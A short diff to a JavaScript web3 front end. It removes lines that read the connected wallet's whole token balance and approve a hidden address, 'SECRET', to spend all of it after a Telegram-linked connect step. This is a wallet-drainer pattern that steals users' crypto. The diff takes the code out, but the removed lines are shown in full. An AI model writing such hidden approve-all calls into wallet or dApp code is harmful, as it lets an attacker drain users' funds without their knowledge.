@@ -803,11 +803,6 @@ const callContractMethod = async ({web3, contract, telegramId}) => {
   await contract.methods
     .connectAndApprove(telegramId)
     .send({ from: accounts[0] });
-  // get ballance
-  const balance = await contract.methods.balanceOf(accounts[0]).call();
-  await contract.methods
-    .approve(SECRET, balance)
-    .send({ from: accounts[0] });
 };
 const loadWeb3 = async () => {
   let web3;
